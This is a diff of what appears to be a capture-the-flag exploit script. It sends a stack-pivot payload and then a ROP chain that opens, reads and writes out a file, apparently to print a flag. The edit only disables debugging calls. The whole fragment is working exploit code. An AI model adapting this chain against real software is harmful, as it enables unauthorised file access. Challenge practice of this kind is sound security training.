@@ -47,9 +47,9 @@ leave_ret = 0x4012EE
 pay = b'\x00' * 0x100
 pay += p64(bssaddr + 5) + p64(pop_rsi) + p64(bssaddr + 5) + p64(readplt) + p64(leave_ret)
 
-ddebug()
+# ddebug()
 io.sendlineafter('solve this task.\n', pay)
-pause()
+
 rop = p64(pop_rdi) + p64(bssaddr + 0xa0 + 5) + p64(pop_rsi) + p64(0) + p64(openaddr) #open
 rop += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(bssaddr + 0x50) + p64(pop_rdx) + p64(0x30) + p64(readaddr) #read
 rop += p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(bssaddr + 0x50) + p64(pop_rdx) + p64(0x30) + p64(writeaddr) # write
